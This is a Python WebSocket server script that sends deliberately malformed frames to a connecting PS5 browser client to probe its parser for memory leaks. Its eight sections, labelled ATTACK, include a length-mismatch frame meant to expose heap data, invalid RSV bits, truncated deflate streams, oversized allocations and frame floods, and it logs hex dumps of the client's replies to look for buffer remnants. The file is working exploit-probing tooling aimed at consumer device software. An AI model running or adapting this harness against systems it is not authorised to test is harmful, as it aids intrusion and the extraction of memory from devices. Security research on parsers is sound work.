#!/usr/bin/env python3
"""WS server v2: malformed frame injection to probe PS5 parser behavior."""
import socket, hashlib, base64, struct, json, datetime, binascii, threading, os, time, zlib

LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ws-captures.log')
MAGIC = b'258EAFA5-E914-47DA-95CA-5AB5353BE740'

def log_entry(entry):
    with open(LOG, 'a') as f:
        f.write(json.dumps(entry) + '\n')
    print(json.dumps(entry, default=str)[:400])

def ws_handshake(conn):
    data = conn.recv(4096)
    headers = {}
    lines = data.decode('utf-8', errors='replace').split('\r\n')
    path = lines[0].split(' ')[1] if len(lines[0].split(' ')) > 1 else '/'
    for line in lines[1:]:
        if ': ' in line:
            k, v = line.split(': ', 1)
            headers[k.lower()] = v
    key = headers.get('sec-websocket-key', '')
    accept = base64.b64encode(hashlib.sha1((key + MAGIC.decode()).encode()).digest()).decode()

    # Check if client offers permessage-deflate
    extensions = headers.get('sec-websocket-extensions', '')
    use_deflate = 'permessage-deflate' in extensions

    resp = 'HTTP/1.1 101 Switching Protocols\r\n'
    resp += 'Upgrade: websocket\r\n'
    resp += 'Connection: Upgrade\r\n'
    resp += 'Sec-WebSocket-Accept: ' + accept + '\r\n'
    if use_deflate:
        resp += 'Sec-WebSocket-Extensions: permessage-deflate; server_no_context_takeover; client_no_context_takeover\r\n'
    resp += '\r\n'
    conn.sendall(resp.encode())
    return path, headers, use_deflate

def send_frame(conn, data, opcode=1, fin=True, rsv1=False):
    """Send a properly formed WS frame."""
    frame = bytearray()
    b0 = opcode
    if fin: b0 |= 0x80
    if rsv1: b0 |= 0x40
    frame.append(b0)
    if isinstance(data, str):
        data = data.encode()
    ln = len(data)
    if ln < 126:
        frame.append(ln)
    elif ln < 65536:
        frame.append(126)
        frame.extend(struct.pack('>H', ln))
    else:
        frame.append(127)
        frame.extend(struct.pack('>Q', ln))
    frame.extend(data)
    conn.sendall(bytes(frame))

def send_raw_bytes(conn, raw):
    """Send raw bytes directly on the socket."""
    conn.sendall(raw)

def read_frame(conn):
    hdr = conn.recv(2)
    if len(hdr) < 2:
        return None, None
    b0, b1 = hdr[0], hdr[1]
    opcode = b0 & 0x0F
    masked = (b1 >> 7) & 1
    payload_len = b1 & 0x7F
    if payload_len == 126:
        ext = conn.recv(2)
        payload_len = struct.unpack('>H', ext)[0]
    elif payload_len == 127:
        ext = conn.recv(8)
        payload_len = struct.unpack('>Q', ext)[0]
    mask_key = conn.recv(4) if masked else None
    data = b''
    while len(data) < payload_len:
        chunk = conn.recv(min(65536, payload_len - len(data)))
        if not chunk:
            break
        data += chunk
    if masked and mask_key:
        data = bytes(data[i] ^ mask_key[i % 4] for i in range(len(data)))
    return opcode, data

def handle_client(conn, addr):
    ts = datetime.datetime.now().isoformat()
    try:
        path, headers, use_deflate = ws_handshake(conn)
        log_entry({"ts": ts, "event": "connect", "addr": str(addr), "path": path, "deflate": use_deflate})

        # === Phase 1: Normal greeting ===
        send_frame(conn, "HELLO-FROM-SERVER-V2")
        time.sleep(0.1)

        # === Phase 2: Send well-formed binary with marker ===
        marker = b"\xDE\xAD\xBE\xEF" + b"\x41" * 60 + b"\xCA\xFE\xBA\xBE"
        send_frame(conn, marker, opcode=2)
        time.sleep(0.1)

        # === ATTACK 1: Frame with length claiming MORE than actual payload ===
        # Craft a frame header that says payload=256 but only send 32 bytes of data
        # Then immediately follow with a valid frame. The parser should wait for
        # 256 bytes total. The next valid frame's header bytes become part of the
        # "payload" — any heap data between might leak.
        # HOWEVER: this will likely just cause the parser to read 256 bytes from
        # the TCP stream, which includes our next frame. We log what JS receives.
        attack1 = bytearray()
        attack1.append(0x82)  # FIN=1, opcode=2 (binary)
        attack1.append(126)   # extended 16-bit length
        attack1.extend(struct.pack('>H', 256))  # claim 256 bytes
        # Only send 32 bytes of actual payload
        attack1.extend(b"\xBB" * 32)
        # Immediately follow with 224 bytes to complete the "frame"
        # Mix of pattern + zeros — the zeros might expose buffer state
        attack1.extend(b"\x00" * 112)
        attack1.extend(b"\xCC" * 112)
        send_raw_bytes(conn, bytes(attack1))
        time.sleep(0.2)

        # === ATTACK 2: Fragmented message with mid-fragment data injection ===
        # Send a text fragment start, then binary data, then continuation
        # This tests if the parser handles cross-type fragments
        # Frame 1: FIN=0 opcode=1 (text start)
        send_frame(conn, "FRAG-START:", opcode=1, fin=False)
        time.sleep(0.05)
        # Frame 2: FIN=1 opcode=0 (continuation, final)
        send_frame(conn, "FRAG-END", opcode=0, fin=True)
        time.sleep(0.2)

        # === ATTACK 3: Zero-length frames ===
        # Some parsers mishandle zero-length payloads
        send_frame(conn, b"", opcode=2)  # empty binary
        send_frame(conn, "", opcode=1)   # empty text
        time.sleep(0.1)

        # === ATTACK 4: Frame with RSV bits set (no extension) ===
        # If deflate wasn't negotiated, RSV1=1 is invalid per RFC 6455
        # Parser might crash or expose unexpected behavior
        if not use_deflate:
            rsv_frame = bytearray()
            rsv_frame.append(0x80 | 0x40 | 0x02)  # FIN=1, RSV1=1, opcode=2
            payload = b"RSV1-PROBE:" + b"\xDD" * 20
            rsv_frame.append(len(payload))
            rsv_frame.extend(payload)
            send_raw_bytes(conn, bytes(rsv_frame))
            time.sleep(0.2)

        # === ATTACK 5: If deflate is on, send compressed frame with expansion ===
        if use_deflate:
            # Compress data with RSV1=1 to indicate compressed
            raw_data = b"DEFLATE-PROBE:" + b"\x00" * 1024
            compressor = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
            compressed = compressor.compress(raw_data) + compressor.flush(zlib.Z_SYNC_FLUSH)
            # Remove trailing 0x00 0x00 0xff 0xff per permessage-deflate spec
            if compressed.endswith(b'\x00\x00\xff\xff'):
                compressed = compressed[:-4]
            send_frame(conn, compressed, opcode=2, rsv1=True)
            time.sleep(0.1)

            # ATTACK 5b: Send INVALID compressed data — truncated zlib stream
            # Parser decompresses, hits unexpected end, might expose buffer remnants
            bad_compressed = compressed[:len(compressed)//2]
            send_frame(conn, bad_compressed, opcode=2, rsv1=True)
            time.sleep(0.2)

        # === ATTACK 6: Oversized frame to force large allocation ===
        # 512KB of patterned data — tests large buffer handling
        large = bytearray(524288)
        for i in range(0, len(large), 8):
            struct.pack_into('<Q', large, i, 0xDEAD000000000000 | i)
        send_frame(conn, bytes(large), opcode=2)
        time.sleep(0.3)

        # === ATTACK 7: Rapid-fire small frames ===
        # 100 tiny frames in quick succession — tests buffer coalescing
        burst = bytearray()
        for i in range(100):
            burst.append(0x82)  # FIN=1, binary
            burst.append(8)     # 8 bytes
            burst.extend(struct.pack('<Q', 0xAAAA000000000000 | i))
        send_raw_bytes(conn, bytes(burst))
        time.sleep(0.3)

        # === ATTACK 8: Ping flood between data ===
        send_frame(conn, b"PING1", opcode=9)  # ping
        send_frame(conn, b"DATA-BETWEEN-PINGS", opcode=2)
        send_frame(conn, b"PING2", opcode=9)  # ping
        time.sleep(0.2)

        # === Phase FINAL: Signal completion ===
        send_frame(conn, "SERVER-ATTACKS-COMPLETE")

        # Now receive and log everything
        while True:
            opcode, data = read_frame(conn)
            if opcode is None or opcode == 8:
                break
            ts = datetime.datetime.now().isoformat()
            if opcode == 1:
                text = data.decode('utf-8', errors='replace')
                log_entry({"ts": ts, "type": "text", "size": len(text), "data": text[:2000]})
                send_frame(conn, "ACK:" + text[:256])
            elif opcode == 2:
                hexdump = binascii.hexlify(data[:2048]).decode()
                nonzero = sum(1 for b in data if b != 0)
                unique = len(set(data))
                log_entry({"ts": ts, "type": "binary", "size": len(data),
                           "nonzero": nonzero, "unique_bytes": unique,
                           "hex": hexdump})
                send_frame(conn, b"ACK:" + data[:128], opcode=2)
            elif opcode == 10:  # pong
                log_entry({"ts": ts, "type": "pong", "data": binascii.hexlify(data).decode()})

    except Exception as e:
        log_entry({"ts": datetime.datetime.now().isoformat(), "event": "error", "error": str(e)[:500]})
    finally:
        log_entry({"ts": datetime.datetime.now().isoformat(), "event": "disconnect", "addr": str(addr)})
        try: conn.close()
        except: pass

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', 9090))
    srv.listen(5)
    print("WS server v2 on 0.0.0.0:9090 (frame injection + deflate) — logging to " + LOG)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == '__main__':
    main()
